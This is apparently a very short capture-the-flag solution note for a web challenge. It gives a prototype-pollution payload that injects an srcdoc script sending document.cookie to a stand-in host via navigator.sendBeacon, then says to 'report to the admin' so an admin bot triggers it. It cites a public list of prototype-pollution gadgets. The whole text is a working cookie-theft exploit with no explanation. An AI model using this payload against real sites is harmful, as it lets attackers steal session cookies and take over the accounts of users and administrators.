1. execute `serialize = () => 'a.constructor.prototype.srcdoc=<script>navigator.sendBeacon("https://example.com",document.cookie)</script>'`
2. report to the admin

ref. https://github.com/BlackFan/client-side-prototype-pollution/blob/bba2290ed3014acc4d678e437080fa049bcc5e30/README.md#:~:text=Sergey%20Bobrov-,Google%20reCAPTCHA,-%3F__proto__%5Bsrcdoc%5D%5B%5D%3D%3Cscript